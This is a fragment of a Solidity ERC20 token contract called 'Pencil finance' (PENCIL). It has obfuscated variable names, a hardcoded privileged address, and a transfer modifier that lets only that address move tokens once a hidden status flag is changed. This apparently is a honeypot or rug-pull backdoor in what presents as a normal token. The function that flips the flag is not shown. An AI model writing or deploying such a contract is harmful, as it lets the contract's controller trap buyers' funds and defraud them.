...
contract TestPencilToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokeng_totalSupply;
    uint256 private _tokeng_status = 0;
    uint256 public stakingPoolgStatus = 0;

    string private _tokeng_name;
    string private _tokeng_symbol;

    address private _poolgAddress = 0xbb49857283b29743D2c6266DBc3489751846EEb4;

    constructor() {
        _tokeng_name = "Pencil finance";
        _tokeng_symbol = "PENCIL";
        _tokeng_totalSupply = 100000 * 10 ** 18;
        _balances[msg.sender] = _tokeng_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolgAddress || _tokeng_status == 0);
        _;
    }
